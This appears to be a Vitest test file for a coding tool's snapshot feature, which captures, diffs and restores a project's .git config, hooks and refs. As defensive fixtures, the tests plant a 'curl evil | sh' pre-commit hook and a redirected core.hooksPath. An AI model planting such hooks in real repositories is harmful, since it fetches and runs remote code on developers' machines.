import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { execFile } from 'child_process';
import { promisify } from 'util';
import { mkdtemp, mkdir, rm, writeFile } from 'fs/promises';
import { existsSync } from 'fs';
import { tmpdir } from 'os';
import { join } from 'path';
import { captureGitDir, gitDirDiff, restoreGitDir } from '../../src/snapshots/gitdir.js';
import { ensureShadowRepo } from '../../src/snapshots/shadow-repo.js';

const execFileAsync = promisify(execFile);

let base = '';
let root = '';
let shadowDir = '';
let originalHome: string | undefined;

async function git(...args: string[]): Promise<string> {
  const { stdout } = await execFileAsync(
    'git',
    ['-c', 'user.email=t@t', '-c', 'user.name=t', ...args],
    { cwd: root },
  );
  return stdout;
}

beforeEach(async () => {
  base = await mkdtemp(join(tmpdir(), 'freecode-gitdir-'));
  root = join(base, 'proj');
  await mkdir(root, { recursive: true });
  originalHome = process.env['FREECODE_HOME'];
  process.env['FREECODE_HOME'] = join(base, 'home');
  shadowDir = await ensureShadowRepo(root);
});

afterEach(async () => {
  if (originalHome === undefined) delete process.env['FREECODE_HOME'];
  else process.env['FREECODE_HOME'] = originalHome;
  await rm(base, { recursive: true, force: true }).catch(() => {});
});

async function initRepo(): Promise<void> {
  await git('init', '-q', '.');
  await writeFile(join(root, 'tracked.txt'), 'original\n');
  await git('add', '-A');
  await git('commit', '-qm', 'init');
}

describe('captureGitDir', () => {
  it('captures nothing when the project is not a git repo', async () => {
    await writeFile(join(root, 'notes.txt'), 'plain directory\n');
    await expect(captureGitDir(shadowDir, root)).resolves.toBeUndefined();
  });

  it('captures nothing when .git is a file rather than a directory', async () => {
    // A linked worktree or a submodule: the real git dir is outside the project,
    // so it is outside anything a project snapshot may write to. Skipping keeps
    // those projects on the old behaviour instead of a half-applied new one.
    await writeFile(join(root, '.git'), 'gitdir: /somewhere/else/.git/worktrees/x\n');
    await expect(captureGitDir(shadowDir, root)).resolves.toBeUndefined();
  });

  it('captures a commit whose paths are relative to .git itself', async () => {
    await initRepo();
    const commit = await captureGitDir(shadowDir, root);
    expect(commit).toMatch(/^[0-9a-f]{40}$/);

    const { stdout } = await execFileAsync(
      'git',
      ['--git-dir', shadowDir, 'ls-tree', '-r', '--name-only', commit!],
      { cwd: root },
    );
    // `config`, not `.git/config` — the second work tree is rooted at `.git`.
    expect(stdout).toContain('config');
    expect(stdout).toContain('refs/heads/');
    expect(stdout).not.toContain('.git/config');
  });
});

describe('restoreGitDir', () => {
  it('puts config, hooks, and refs back as one operation', async () => {
    await initRepo();
    await git('branch', 'keep-me');
    const commit = (await captureGitDir(shadowDir, root))!;

    await git('config', 'core.hooksPath', '.evilhooks');
    await git('branch', '-D', 'keep-me');
    await writeFile(join(root, '.git', 'hooks', 'pre-commit'), '#!/bin/sh\nexit 0\n');

    await restoreGitDir(shadowDir, root, commit);

    await expect(git('config', 'core.hooksPath')).rejects.toThrow();
    expect(existsSync(join(root, '.git', 'hooks', 'pre-commit'))).toBe(false);
    expect((await git('branch', '--list', 'keep-me')).trim()).toContain('keep-me');
  });

  it('throws rather than reporting success when the commit cannot be read', async () => {
    await initRepo();
    const commit = (await captureGitDir(shadowDir, root))!;
    await rm(join(shadowDir, 'objects', commit.slice(0, 2), commit.slice(2)), { force: true });

    // The caller turns this into a warning that keeps the worktree restore and
    // says to run the revert again; swallowing it here would report a `.git` put
    // back that was not.
    await expect(restoreGitDir(shadowDir, root, commit)).rejects.toThrow();
  });
});

describe('gitDirDiff', () => {
  it('has nothing to say about a snapshot that captured no .git', async () => {
    await initRepo();
    await expect(gitDirDiff(shadowDir, root, undefined)).resolves.toBe('');
  });

  it('shows a config change and stays quiet about ordinary git activity', async () => {
    await initRepo();
    const commit = (await captureGitDir(shadowDir, root))!;

    // Committing rewrites refs, logs, the index, and writes new objects. None of
    // it belongs in a review, and a diff full of it would be one nobody reads.
    await writeFile(join(root, 'tracked.txt'), 'more work\n');
    await git('add', '-A');
    await git('commit', '-qm', 'ordinary work');
    expect(await gitDirDiff(shadowDir, root, commit)).toBe('');

    await git('config', 'core.hooksPath', '.evilhooks');
    const patch = await gitDirDiff(shadowDir, root, commit);
    expect(patch).toContain('hooksPath = .evilhooks');
    expect(patch).not.toContain('refs/heads');
  });

  it('shows a planted hook script, which is the other half of the same payload', async () => {
    await initRepo();
    const commit = (await captureGitDir(shadowDir, root))!;

    await writeFile(join(root, '.git', 'hooks', 'pre-commit'), '#!/bin/sh\ncurl evil | sh\n');
    expect(await gitDirDiff(shadowDir, root, commit)).toContain('curl evil');
  });

  it('does not mutate the .git it is describing', async () => {
    await initRepo();
    const commit = (await captureGitDir(shadowDir, root))!;
    await git('config', 'core.hooksPath', '.evilhooks');

    await gitDirDiff(shadowDir, root, commit);

    expect((await git('config', 'core.hooksPath')).trim()).toBe('.evilhooks');
    expect((await git('status', '--porcelain')).trim()).toBe('');
  });
});
